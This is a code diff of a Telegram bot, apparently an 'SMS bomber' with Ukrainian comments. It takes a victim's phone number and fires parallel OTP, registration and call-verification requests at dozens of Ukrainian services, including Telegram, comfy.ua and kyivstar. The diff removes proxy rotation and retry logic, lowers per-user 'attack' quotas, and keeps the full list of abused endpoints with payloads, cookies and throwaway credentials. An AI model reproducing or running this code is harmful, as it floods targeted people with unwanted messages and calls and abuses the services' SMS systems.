@@ -49,39 +49,9 @@ attack_flags = {}
 # Прапорці для розіграшів
 giveaway_flags = {}
 
-# Глобальний HTTP клієнт з пулом (оптимізація)
-_http_session: aiohttp.ClientSession = None
-_session_lock = asyncio.Lock()
-
-# Proxy circuit breaker та weighted cache
-_proxy_cache = {}
-_proxy_weights = {}
-_proxy_circuit_breaker = {}  # proxy_url -> (fail_count, last_fail_time)
-_proxy_cache_lock = asyncio.Lock()
-USE_PROXIES = True  # Toggle для вимкнення проксі
-
-# Service priority/weight cache
-_service_weights = {}
-
 storage = MemoryStorage()
 bot = Bot(token=config.token)
 dp = Dispatcher(bot, storage=storage)
-
-async def get_http_session():
-    """Перевикористання HTTP сесії з пулом конекшнів"""
-    global _http_session
-    async with _session_lock:
-        if _http_session is None or _http_session.closed:
-            connector = aiohttp.TCPConnector(limit=100, limit_per_host=20, ttl_dns_cache=300)
-            # Таймаути вимкнено для плавної роботи
-            timeout = None
-            _http_session = aiohttp.ClientSession(
-                connector=connector,
-                timeout=timeout,
-                headers={"User-Agent": fake_useragent.UserAgent().random}
-            )
-            logging.debug("[HTTP] Created new session with connection pool")
-        return _http_session
 
 async def init_db():
     global db_pool
@@ -100,7 +70,7 @@ async def init_db():
                 name TEXT,
                 username TEXT,
                 block INTEGER DEFAULT 0,
-                attacks_left INTEGER DEFAULT 30,
+                attacks_left INTEGER DEFAULT 6,
                 promo_attacks INTEGER DEFAULT 0,
                 referral_attacks INTEGER DEFAULT 0,
                 unused_referral_attacks INTEGER DEFAULT 0,
@@ -118,15 +88,6 @@ async def init_db():
                 referred_id BIGINT,
                 join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 UNIQUE(referred_id)
-            );
-            CREATE TABLE IF NOT EXISTS proxies (
-                id SERIAL PRIMARY KEY,
-                proxy_url TEXT UNIQUE NOT NULL,
-                last_check TIMESTAMP,
-                avg_latency_ms INTEGER DEFAULT 0,
-                success_count INTEGER DEFAULT 0,
-                fail_count INTEGER DEFAULT 0,
-                is_active BOOLEAN DEFAULT TRUE
             );
             CREATE TABLE IF NOT EXISTS user_messages (
                 id SERIAL PRIMARY KEY,
@@ -178,31 +139,6 @@ async def init_db():
             await conn.execute('ALTER TABLE users ALTER COLUMN last_attack_date TYPE TIMESTAMP USING last_attack_date::timestamp')
         except Exception as e:
             logging.error(f"Error changing last_attack_date column type: {e}")
-
-        # Ensure default daily limit is 30 for existing rows on a new day reset
-        try:
-            await conn.execute("UPDATE users SET attacks_left = 30 WHERE attacks_left IS NULL")
-        except Exception as e:
-            logging.error(f"Error normalizing attacks_left defaults: {e}")
-        
-        # Create indexes for better performance
-        try:
-            await conn.execute('CREATE INDEX IF NOT EXISTS idx_users_block ON users(block)')
-            await conn.execute('CREATE INDEX IF NOT EXISTS idx_users_last_attack_date ON users(last_attack_date)')
-            await conn.execute('CREATE INDEX IF NOT EXISTS idx_referrals_referrer ON referrals(referrer_id)')
-            await conn.execute('CREATE INDEX IF NOT EXISTS idx_referrals_referred ON referrals(referred_id)')
-            await conn.execute('CREATE INDEX IF NOT EXISTS idx_proxies_active ON proxies(is_active, last_check)')
-            await conn.execute('CREATE INDEX IF NOT EXISTS idx_blacklist_phone ON blacklist(phone_number)')
-            logging.info("[DB] Indexes created/verified")
-        except Exception as e:
-            logging.error(f"Error creating indexes: {e}")
-
-    # Load proxies from local files (if present)
-    try:
-        await load_proxies_from_possible_files()
-        await normalize_existing_proxies()
-    except Exception as e:
-        logging.error(f"Proxy file load error: {e}")
 
 class Dialog(StatesGroup):
     spam = State()
@@ -262,9 +198,9 @@ async def anti_flood(*args, **kwargs):
 profile_button = types.KeyboardButton('🎯 Почати атаку')
 referal_button = types.KeyboardButton('🆘 Допомога')
 referral_program_button = types.KeyboardButton('🎪 Запросити друга')
-check_attacks_button = types.KeyboardButton('❓ Перевірити атаки')
-promo_code_button = types.KeyboardButton('😋У мене є промокод')
-profile_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True).add(profile_button, referal_button).add(referral_program_button, check_attacks_button).add(promo_code_button)
+# check_attacks_button = types.KeyboardButton('❓ Перевірити атаки')  # Прибрано
+# promo_button = types.KeyboardButton('Промокод 🎁')  # Прибрано
+profile_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True).add(profile_button, referal_button).add(referral_program_button)
 
 admin_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
 admin_keyboard.add("Надіслати повідомлення користувачам")
@@ -276,8 +212,6 @@ admin_keyboard.add("Реферали")
 admin_keyboard.add("Створити промокод")
 admin_keyboard.add("Видалити промокод")
 admin_keyboard.add("Список промокодів")
-admin_keyboard.add("Перевірка проксі")
-admin_keyboard.add("Увімкнути/вимкнути проксі")
 admin_keyboard.add("Назад")
 
 def generate_promo_code():
@@ -291,7 +225,7 @@ async def add_user(user_id: int, name: str, username: str, referrer_id: int = No
     async with db_pool.acquire() as conn:
         await conn.execute(
             'INSERT INTO users (user_id, name, username, block, attacks_left, promo_attacks, referral_attacks, unused_referral_attacks, last_attack_date, referrer_id) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10) ON CONFLICT (user_id) DO NOTHING',
-            user_id, name, username, 0, 30, 0, 0, 0, today, referrer_id
+            user_id, name, username, 0, 6, 0, 0, 0, today, referrer_id
         )
         
         if referrer_id:
@@ -301,20 +235,15 @@ async def add_user(user_id: int, name: str, username: str, referrer_id: int = No
             )
             
             await conn.execute(
-                'UPDATE users SET referral_attacks = referral_attacks + 10, referral_count = referral_count + 1 WHERE user_id = $1',
+                'UPDATE users SET referral_attacks = referral_attacks + 6, referral_count = referral_count + 1 WHERE user_id = $1',
                 referrer_id
-            )
-            # Бонус запрошеному користувачу на один день
-            await conn.execute(
-                'UPDATE users SET referral_attacks = referral_attacks + 10 WHERE user_id = $1',
-                user_id
             )
 
             try:
                 ref_name = username or name or f"User{user_id}"
                 await bot.send_message(
                     referrer_id,
-                    f"🎉 За вашим посиланням приєднався новий користувач: <a href='tg://user?id={user_id}'>{ref_name}</a>\n🚀 Ви отримали +10 додаткових атак на один день!",
+                    f"🎉 За вашим посиланням приєднався новий користувач: <a href='tg://user?id={user_id}'>{ref_name}</a>\n🚀 Ви отримали +6 додаткових атак на один день!",
                     parse_mode='HTML'
                 )
             except Exception as e:
@@ -642,63 +571,9 @@ async def list_promos(message: Message):
     else:
         await message.answer("Недостатньо прав.")
 
-@dp.message_handler(text="Перевірка проксі")
-async def proxy_check_menu(message: Message):
-    if message.from_user.id not in ADMIN:
-        await message.answer('Недостатньо прав.')
-        return
-    await message.answer('🔎 Запускаю перевірку проксі...')
-    # If empty, try to (re)load from files first
-    async with db_pool.acquire() as conn:
-        count = await conn.fetchval('SELECT COUNT(*) FROM proxies WHERE is_active = TRUE')
-    if not count:
-        try:
-            await load_proxies_from_possible_files()
-        except Exception as e:
-            logging.error(f"Reload proxies error: {e}")
-    await ensure_recent_proxy_check(max_age_minutes=0)
-    # Формуємо звіт
-    async with db_pool.acquire() as conn:
-        rows = await conn.fetch('SELECT proxy_url, last_check, avg_latency_ms, success_count, fail_count FROM proxies WHERE is_active = TRUE ORDER BY proxy_url')
-    if not rows:
-        await message.answer('Проксі не додані.')
-        return
-    
-    # Розділяємо на частини (максимум 10 проксі на повідомлення)
-    PROXIES_PER_MESSAGE = 10
-    total_count = len(rows)
-    
-    for i in range(0, len(rows), PROXIES_PER_MESSAGE):
-        chunk = rows[i:i + PROXIES_PER_MESSAGE]
-        part_num = (i // PROXIES_PER_MESSAGE) + 1
-        total_parts = (len(rows) + PROXIES_PER_MESSAGE - 1) // PROXIES_PER_MESSAGE
-        
-        lines = [f"📡 Перевірка проксі (частина {part_num}/{total_parts}, всього: {total_count}):\n"]
-        for r in chunk:
-            total = r['success_count'] + r['fail_count']
-            rate = (r['success_count'] * 100 // total) if total > 0 else 0
-            last = r['last_check'].strftime('%d.%m.%Y %H:%M') if r['last_check'] else '—'
-            # Скорочений формат для економії місця
-            lines.append(f"• {mask_proxy_for_log(r['proxy_url'])}\n  ├ {rate}% | {r['avg_latency_ms']}мс | {last}")
-        
-        await message.answer('\n'.join(lines))
-        # Невелика пауза між повідомленнями
-        if i + PROXIES_PER_MESSAGE < len(rows):
-            await asyncio.sleep(0.3)
-
-@dp.message_handler(text="Увімкнути/вимкнути проксі")
-async def toggle_proxies(message: Message):
-    global USE_PROXIES
-    if message.from_user.id not in ADMIN:
-        await message.answer('Недостатньо прав.')
-        return
-    USE_PROXIES = not USE_PROXIES
-    status = "увімкнено" if USE_PROXIES else "вимкнено"
-    await message.answer(f"✅ Проксі тепер <b>{status}</b>", parse_mode='HTML')
-
 # ПРОМОКОДЫ - ПОЛЬЗОВАТЕЛИ
 
-@dp.message_handler(text='У мене є промокод')
+@dp.message_handler(text='Промокод 🎁')
 async def promo_handler(message: types.Message):
     # Перевіряємо, що повідомлення з особистого чату
     if message.chat.type != 'private':
@@ -863,12 +738,8 @@ async def broadcast_message(message: Message, state: FSMContext):
     success_count = 0
     error_count = 0
 
-    # Батчинг: відправляємо по 20 користувачів паралельно
-    BATCH_SIZE = 20
-    
-    async def send_to_user(user_id: int):
-        """Асинхронна функція для відправки одному користувачу"""
-        nonlocal success_count, error_count
+    for user in users:
+        user_id = user['user_id']
         try:
             if content_type == "text":
                 await bot.send_message(user_id, text)
@@ -880,23 +751,17 @@ async def broadcast_message(message: Message, state: FSMContext):
                 await bot.send_document(user_id, document_id, caption=text)
             success_count += 1
         except BotBlocked:
+            logging.error(f"Бота заблокував користувач {user_id}. Пропускаємо його.")
             error_count += 1
         except UserDeactivated:
+            logging.error(f"Користувач {user_id} деактивував аккаунт. Пропускаємо його.")
             error_count += 1
         except ChatNotFound:
+            logging.error(f"Чат з користувачем {user_id} не знайдено. Пропускаємо його.")
             error_count += 1
         except Exception as e:
-            logging.debug(f"Помилка при відправленні користувачу {user_id}: {e}")
+            logging.error(f"Помилка при відправленні повідомлення користувачу {user_id}: {str(e)}")
             error_count += 1
-
-    # Відправляємо батчами паралельно
-    for i in range(0, len(users), BATCH_SIZE):
-        batch = users[i:i + BATCH_SIZE]
-        tasks = [send_to_user(user['user_id']) for user in batch]
-        await asyncio.gather(*tasks, return_exceptions=True)
-        # Невелика пауза між батчами, щоб не перевантажити API
-        if i + BATCH_SIZE < len(users):
-            await asyncio.sleep(0.1)
 
     await message.answer(f'Повідомлення відправлено!\nУспішно: {success_count}\nПомилок: {error_count}')
     await state.finish()
@@ -1088,7 +953,7 @@ async def help(message: types.Message):
     inline_keyboard = types.InlineKeyboardMarkup()
     code_sub = types.InlineKeyboardButton(text='🎪 Канал', url='https://t.me/+tod0WSFEpEQ2ODcy')
     inline_keyboard = inline_keyboard.add(code_sub)
-    await bot.send_message(message.chat.id, "Виникли питання? Звертайся до @Nobysss", disable_web_page_preview=True, parse_mode="HTML", reply_markup=inline_keyboard)
+    await bot.send_message(message.chat.id, "Виникли питання? Звертайся до @ABOBA", disable_web_page_preview=True, parse_mode="HTML", reply_markup=inline_keyboard)
 
 
 
@@ -1162,49 +1027,6 @@ async def referral_program(message: types.Message):
     
     await message.answer(message_text, parse_mode='HTML', reply_markup=keyboard)
 
-@dp.message_handler(text='❓ Перевірити атаки')
-@dp.throttled(anti_flood, rate=3)
-async def check_attacks(message: types.Message):
-    # Перевіряємо, що повідомлення з особистого чату
-    if message.chat.type != 'private':
-        return
-    
-    user_id = message.from_user.id
-    
-    if not await user_exists(user_id):
-        await message.answer("Для використання бота потрібно натиснути /start")
-        return
-    
-    async with db_pool.acquire() as conn:
-        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
-    
-    if result and result['block'] == 1:
-        await message.answer("Вас заблоковано і ви не можете користуватися ботом.")
-        return
-
-    if not await check_subscription_status(user_id):
-        await message.answer("Ви відписалися від каналу. Підпишіться, щоб продовжити використання бота.", reply_markup=checkSubMenu)
-        return
-    
-    # Отримуємо актуальну інформацію про атаки
-    can_attack, attacks_left, promo_attacks, referral_attacks = await check_attack_limits(user_id)
-    total_attacks = attacks_left + promo_attacks + referral_attacks
-    
-    message_text = "📊 <b>Ваші атаки:</b>\n\n"
-    message_text += f"⚔️ Звичайні атаки: {attacks_left}\n"
-    if promo_attacks > 0:
-        message_text += f"🎁 Промо атаки: {promo_attacks}\n"
-    if referral_attacks > 0:
-        message_text += f"🎪 Реферальні атаки: {referral_attacks}\n"
-    message_text += f"\n💥 <b>Всього доступно: {total_attacks}</b>\n\n"
-    
-    if total_attacks > 0:
-        message_text += "✅ Ви можете розпочати атаку!"
-    else:
-        message_text += "❌ На сьогодні ліміт атак вичерпано. Чекаємо на вас завтра або ви можете скористуватись промокодом чи рефералом."
-    
-    await message.answer(message_text, parse_mode='HTML')
-
 @dp.message_handler(text='🎯 Почати атаку')
 async def start_attack_prompt(message: Message):
     # Перевіряємо, що повідомлення з особистого чату
@@ -1228,6 +1050,8 @@ async def start_attack_prompt(message: Message):
         await message.answer("Ви відписалися від каналу. Підпишіться, щоб продовжити використання бота.", reply_markup=checkSubMenu)
         return
     
+    # Бот безлімітний - перевірка лімітів вимкнена
+    
     message_text = '🎯 Готовий до атаки!\n\n💥 Очікую на номер телефону..'
     
     await message.answer(message_text, parse_mode="html", reply_markup=profile_keyboard)
@@ -1243,69 +1067,10 @@ async def send_request(url, data=None, json=None, headers=None, method='POST', c
         else:
             raise ValueError(f"Unsupported method {method}")
 
-async def ukr(number, chat_id, proxy_counter=None, shuffled_proxies_list=None):
+async def ukr(number, chat_id):
     headers = {"User-Agent": fake_useragent.UserAgent().random}
-    
-    # Перевикористовуємо HTTP session
-    session = await get_http_session()
-    
-    # Лічильник для round-robin розподілу проксі (якщо не передано, створюємо новий)
-    if proxy_counter is None:
-        _proxy_counter = {'value': 0}
-    else:
-        _proxy_counter = proxy_counter
-    
-    # Використовуємо переданий список перемішаних проксі або створюємо новий
-    import random
-    if shuffled_proxies_list is not None and len(shuffled_proxies_list) > 0:
-        # Використовуємо існуючий перемішаний список (для продовження між етапами)
-        shuffled_proxies = shuffled_proxies_list
-        logging.debug(f"[ATTACK] Використовуємо {len(shuffled_proxies)} проксі з попереднього етапу (поточний індекс: {_proxy_counter['value']})")
-    else:
-        # Отримуємо нові проксі та перемішуємо (тільки для першого етапу)
-        proxies = []
-        if USE_PROXIES:
-            try:
-                proxies = await get_available_proxies(min_success_rate=0, use_cache=True)
-                logging.debug(f"[ATTACK] Proxies for attack: {len(proxies)} available")
-            except Exception as e:
-                logging.error(f"[ATTACK] Помилка отримання проксі: {e}")
-                proxies = []
-        
-        shuffled_proxies = proxies.copy()
-        random.shuffle(shuffled_proxies)
-        logging.debug(f"[ATTACK] Створено новий перемішаний список з {len(shuffled_proxies)} проксі")
-    
-    def pick_proxy():
-        """Повертає випадковий проксі з перемішаного списку для максимальної випадковості"""
-        if not shuffled_proxies or not USE_PROXIES:
-            return None, None
-        try:
-            # Випадковий вибір з перемішаного списку (але всі проксі використаються рівномірно через перемішування)
-            # Використовуємо round-robin як базу, але додаємо випадковість
-            import random
-            if len(shuffled_proxies) > 1:
-                # Використовуємо round-robin з випадковим offset для більшої випадковості
-                base_idx = _proxy_counter['value'] % len(shuffled_proxies)
-                _proxy_counter['value'] += 1
-                # Додаємо невеликий випадковий зсув (0-2 позиції) для різноманітності
-                offset = random.randint(0, min(2, len(shuffled_proxies) - 1))
-                idx = (base_idx + offset) % len(shuffled_proxies)
-                selected = shuffled_proxies[idx]
-            elif len(shuffled_proxies) == 1:
-                idx = 0
-                selected = shuffled_proxies[0]
-                _proxy_counter['value'] += 1
-            else:
-                return None, None
-            
-            normalized = normalize_proxy_string(selected)
-            url, auth = parse_proxy_for_aiohttp(normalized)
-            logging.debug(f"[PROXY] Pick proxy[{idx}/{len(shuffled_proxies)}] => {mask_proxy_for_log(normalized)}")
-            return url, auth
-        except Exception as e:
-            logging.error(f"[ATTACK] Помилка парсингу проксі: {e}")
-            return None, None
+    proxy = None
+    proxy_auth = None
 
     csrf_url = "https://auto.ria.com/iframe-ria-login/registration/2/4"
     try:
@@ -1327,375 +1092,112 @@ async def ukr(number, chat_id, proxy_counter=None, shuffled_proxies_list=None):
 
     logging.info(f"Запуск атаки на номер {number}")
 
-    async def send_request_with_retry(url, **kwargs):
-        """Відправка з retry та новим проксі при fail"""
-        MAX_RETRIES = 2
-        method = kwargs.pop('method', 'POST')
-        original_proxy = kwargs.get('proxy')
-        original_auth = kwargs.get('proxy_auth')
-        req_cookies = kwargs.pop('cookies', None)
-        
-        # Використовуємо окрему сесію якщо є cookies, інакше перевикористовуємо глобальну
-        use_custom_session = req_cookies is not None
-        
-        for attempt in range(MAX_RETRIES + 1):
-            try:
-                if not attack_flags.get(chat_id):
-                    return
+    async def send_request_and_log(url, **kwargs):
+        try:
+            if not attack_flags.get(chat_id):
+                return
                 
-                # При retry пробуємо випадковий новий проксі (якщо є)
-                if attempt > 0 and shuffled_proxies and USE_PROXIES:
-                    try:
-                        import random
-                        # Вибираємо абсолютно випадковий проксі для retry
-                        retry_proxy = random.choice(shuffled_proxies)
-                        normalized = normalize_proxy_string(retry_proxy)
-                        new_proxy, new_auth = parse_proxy_for_aiohttp(normalized)
-                        if new_proxy:
-                            kwargs['proxy'] = new_proxy
-                            kwargs['proxy_auth'] = new_auth
-                            logging.debug(f"[ATTACK] Retry {attempt} for {url} with random proxy")
-                        else:
-                            kwargs['proxy'] = original_proxy
-                            kwargs['proxy_auth'] = original_auth
-                    except Exception:
-                        kwargs['proxy'] = original_proxy
-                        kwargs['proxy_auth'] = original_auth
-                
-                if use_custom_session:
-                    async with aiohttp.ClientSession(cookies=req_cookies) as custom_session:
-                        if method == 'GET':
-                            async with custom_session.get(url, **kwargs) as response:
-                                if response.status == 200:
-                                    logging.debug(f"[ATTACK] Success - {number} -> {url}")
-                                    return True
-                        else:
-                            async with custom_session.post(url, **kwargs) as response:
-                                if response.status == 200:
-                                    logging.debug(f"[ATTACK] Success - {number} -> {url}")
-                                    return True
-                else:
-                    if method == 'GET':
-                        async with session.get(url, **kwargs) as response:
-                            if response.status == 200:
-                                logging.debug(f"[ATTACK] Success - {number} -> {url}")
-                                return True
-                    else:
-                        async with session.post(url, **kwargs) as response:
-                            if response.status == 200:
-                                logging.debug(f"[ATTACK] Success - {number} -> {url}")
-                                return True
-                return False
-            except asyncio.TimeoutError:
-                # Таймаути вимкнені, але залишаємо обробку на випадок інших помилок
-                if attempt < MAX_RETRIES:
-                    logging.debug(f"[ATTACK] Retry {attempt+1} for {url}")
-                    await asyncio.sleep(0.2 * (attempt + 1))
-                    continue
-                logging.debug(f"[ATTACK] Failed after {MAX_RETRIES+1} attempts: {url}")
-                # Update circuit breaker для проксі
-                if original_proxy and USE_PROXIES:
-                    now = asyncio.get_event_loop().time()
-                    if original_proxy in _proxy_circuit_breaker:
-                        _proxy_circuit_breaker[original_proxy] = (_proxy_circuit_breaker[original_proxy][0] + 1, now)
-                    else:
-                        _proxy_circuit_breaker[original_proxy] = (1, now)
-                return False
-            except aiohttp.ClientError as e:
-                if attempt < MAX_RETRIES:
-                    logging.debug(f"[ATTACK] ClientError retry {attempt+1} for {url}: {e}")
-                    await asyncio.sleep(0.2 * (attempt + 1))
-                    continue
-                logging.debug(f"[ATTACK] ClientError after {MAX_RETRIES+1} attempts: {url} - {e}")
-                return False
-            except Exception as e:
-                logging.debug(f"[ATTACK] Exception for {url}: {e}")
-                return False
-        
-        return False
+            timeout = aiohttp.ClientTimeout(total=5)
+            async with aiohttp.ClientSession(timeout=timeout) as session:
+                async with session.post(url, **kwargs) as response:
+                    if response.status == 200:
+                        logging.info(f"Успіх - {number}")
+        except asyncio.TimeoutError:
+            logging.error(f"Таймаут при запиті до {url}")
+        except aiohttp.ClientError as e:
+            logging.error(f"Помилка підключення до {url}: {e}")
+        except Exception as e:
+            logging.error(f"Невідома помилка при запиті до {url}: {e}")
 
-    # Semaphore для контролю паралелізму (зменшено для плавної роботи)
-    semaphore = asyncio.Semaphore(8)
+    semaphore = asyncio.Semaphore(5)
     
     async def bounded_request(url, **kwargs):
         if not attack_flags.get(chat_id):
             return
         async with semaphore:
-            await send_request_with_retry(url, **kwargs)
+            await send_request_and_log(url, **kwargs)
 
-    # Рандомізація та каскад: перемішуємо сервіси та додаємо паузи
-    import random
-    # Створюємо список запитів з унікальними проксі для кожного
-    services = [
-        ("https://my.telegram.org/auth/send_password", {"data": {"phone": "+" + number}}, 'POST'),
-        ("https://helsi.me/api/healthy/v2/accounts/login", {"json": {"phone": number, "platform": "PISWeb"}}, 'POST'),
-        ("https://auth.multiplex.ua/login", {"json": {"login": "+" + number}}, 'POST'),
-        ("https://api.pizzaday.ua/api/V1/user/sendCode", {"json": {"applicationSend": "sms", "lang": "uk", "phone": number}}, 'POST'),
-        ("https://stationpizza.com.ua/api/v1/auth/phone-auth", {"json": {"needSubscribeForNews": "false", "phone": formatted_number}}, 'POST'),
-        ("https://core.takeuseat.in.ua/auth/user/requestSMSVerification", {"json": {"phone": "+" + number}}, 'POST'),
-        ("https://aurum.in.ua/local/ajax/authorize.php?lang=ua", {"json": {"phone": formatted_number, "type": ""}}, 'POST'),
-        ("https://pizza-time.eatery.club/site/v1/pre-login", {"json": {"phone": number}}, 'POST'),
-        ("https://iq-pizza.eatery.club/site/v1/pre-login", {"json": {"phone": number}}, 'POST'),
-        ("https://dnipro-m.ua/ru/phone-verification/", {"json": {"phone": number}, "headers": headers_dnipro, "cookies": cookies_dnipro}, 'POST'),
-        ("https://my.ctrs.com.ua/api/v2/signup", {"json": {"email": "finn889ik@gmail.com", "name": "Денис", "phone": number}, "headers": headers_citrus, "cookies": cookies_citrus}, 'POST'),
-        ("https://my.ctrs.com.ua/api/auth/login", {"json": {"identity": "+" + number}, "headers": headers_citrus, "cookies": cookies_citrus}, 'POST'),
-        ("https://auth.easypay.ua/api/check", {"json": {"phone": number}, "headers": headers_easypay}, 'POST'),
-        ("https://sandalini.ua/ru/signup/", {"data": {"data[firstname]": "деня", "data[phone]": formatted_number2, "wa_json_mode": "1", "need_redirects  ": "1", "contact_type": "person"}}, 'POST'),
-        ("https://uvape.pro/index.php?route=account/register/add", {"data": {"firstname": "деня", "telephone": formatted_number3, "email": "random@gmail.com", "password": "VHHsq6b#v.q>]Fk"}, "headers": headers_uvape, "cookies": cookies_uvape}, 'POST'),
-        ("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", {"data": {"phone": formatted_number4}}, 'POST'),
-        ("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", {"data": {"phone": formatted_number4, "only_sms": "1"}}, 'POST'),
-        ("https://terra-vape.com.ua/index.php?route=common/modal_register/register_validate", {"data": {"firstname": "деня", "lastname": "деневич", "email": "randi@gmail.com", "telephone": number, "password": "password24-", "smscode": "", "step": "first_step"}, "headers": headers_terravape, "cookies": cookies_terravape}, 'POST'),
-        ("https://im.comfy.ua/api/auth/v3/otp/send", {"json": {"phone": number}}, 'POST'),
-        ("https://im.comfy.ua/api/auth/v3/ivr/send", {"json": {"phone": number}}, 'POST'),
-        ("https://www.moyo.ua/identity/registration", {"data": {"firstname": "деня", "phone": formatted_number5, "email": "rando@gmail.com"}, "headers": headers_moyo, "cookies": cookies_moyo}, 'POST'),
-        ("https://pizza.od.ua/ajax/reg.php", {"data": {"phone": formatted_number4}}, 'POST'),
-        ("https://sushiya.ua/ru/api/v1/user/auth", {"data": {"phone": number[2:], "need_skeep": ""}, "headers": headers_sushiya}, 'POST'),
-        ("https://avrora.ua/index.php?dispatch=otp.send", {"data": {"phone": formatted_number6, "security_hash": "0dc890802de67228597af47d95a7f52b", "is_ajax": "1"}}, 'POST'),
-        ("https://zolotakraina.ua/ua/turbosms/verification/code", {"data": {"telephone": number, "email": "rando@gmail.com", "form_key": "PKRxVkPlQqBlb8Wi"}, "headers": headers_zolota, "cookies": cookies_zolota}, 'POST'),
-        ("https://auto.ria.com/iframe-ria-login/registration/2/4", {"data": {"_csrf": csrf_token, "RegistrationForm[email]": f"{number}", "RegistrationForm[name]": "деня", "RegistrationForm[second_name]": "деневич", "RegistrationForm[agree]": "1", "RegistrationForm[need_sms]": "1"}, "headers": headers_avtoria, "cookies": cookies_avtoria}, 'POST'),
-        (f"https://ukrpas.ua/login?phone=+{number}", {}, 'GET'),
-        ("https://maslotom.com/api/index.php?route=api/account/phoneLogin", {"data": {"phone": formatted_number6}}, 'POST'),
-        ("https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua", {"json": {"phone": "+" + number}}, 'POST'),
-        ("https://getvape.com.ua/index.php?route=extension/module/regsms/sendcode", {"data": {"telephone": formatted_number7}}, 'POST'),
-        ("https://api.iqos.com.ua/v1/auth/otp", {"json": {"phone": number}}, 'POST'),
-        (f"https://llty-api.lvivkholod.com/api/client/{number}", {}, 'POST'),
-        ("https://api-mobile.planetakino.ua/graphql", {"json": {"query": "mutation customerVerifyByPhone($phone: String!) { customerVerifyByPhone(phone: $phone) { isRegistered }}", "variables": {"phone": "+" + number}}}, 'POST'),
-        ("https://back.trofim.com.ua/api/via-phone-number", {"json": {"phone": number}}, 'POST'),
-        ("https://dracula.robota.ua/?q=SendOtpCode", {"json": {"operationName": "SendOtpCode", "query": "mutation SendOtpCode($phone: String!) {  users {    login {      otpLogin {        sendConfirmation(phone: $phone) {          status          remainingAttempts          __typename        }        __typename      }      __typename    }    __typename  }}", "variables": {"phone": number}}}, 'POST'),
-        (f"https://shop.kyivstar.ua/api/v2/otp_login/send/{number[2:]}", {}, 'GET'),
-        ("https://elmir.ua/response/load_json.php?type=validate_phone", {"data": {"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "code"}, "headers": headers_elmir, "cookies": cookies_elmir}, 'POST'),
-        ("https://elmir.ua/response/load_json.php?type=validate_phone", {"data": {"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "call"}, "headers": headers_elmir_call, "cookies": cookies_elmir_call}, 'POST'),
-        (f"https://bars.itbi.com.ua/smart-cards-api/common/users/otp?lang=uk&phone={number}", {}, 'GET'),
-        ("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", {"json": {"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}}, 'POST')
+    tasks = [
+        bounded_request("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://helsi.me/api/healthy/v2/accounts/login", json={"phone": number, "platform": "PISWeb"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://auth.multiplex.ua/login", json={"login": "+" + number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://api.pizzaday.ua/api/V1/user/sendCode", json={"applicationSend": "sms", "lang": "uk", "phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://stationpizza.com.ua/api/v1/auth/phone-auth", json={"needSubscribeForNews": "false", "phone": formatted_number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://core.takeuseat.in.ua/auth/user/requestSMSVerification", json={"phone": "+" + number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://aurum.in.ua/local/ajax/authorize.php?lang=ua", json={"phone": formatted_number, "type": ""}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://pizza-time.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://iq-pizza.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://dnipro-m.ua/ru/phone-verification/", json={"phone": number}, headers=headers_dnipro, cookies=cookies_dnipro, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://my.ctrs.com.ua/api/v2/signup", json={"email": "finn889ik@gmail.com", "name": "Денис", "phone": number}, headers=headers_citrus, cookies=cookies_citrus, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://my.ctrs.com.ua/api/auth/login", json={"identity": "+" + number}, headers=headers_citrus, cookies=cookies_citrus, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://auth.easypay.ua/api/check", json={"phone": number}, headers=headers_easypay, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://sandalini.ua/ru/signup/", data={"data[firstname]": "деня", "data[phone]": formatted_number2, "wa_json_mode": "1", "need_redirects  ": "1", "contact_type": "person"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://uvape.pro/index.php?route=account/register/add", data={"firstname": "деня", "telephone": formatted_number3, "email": "random@gmail.com", "password": "VHHsq6b#v.q>]Fk"}, headers=headers_uvape, cookies=cookies_uvape, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", data={"phone": formatted_number4}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", data={"phone": formatted_number4, "only_sms": "1"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://terra-vape.com.ua/index.php?route=common/modal_register/register_validate", data={"firstname": "деня", "lastname": "деневич", "email": "randi@gmail.com", "telephone": number, "password": "password24-", "smscode": "", "step": "first_step"}, headers=headers_terravape,cookies=cookies_terravape, proxy=proxy, proxy_auth=proxy_auth),
+        bounded_request("https://im.comfy.ua/api/auth/v3/otp/send", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
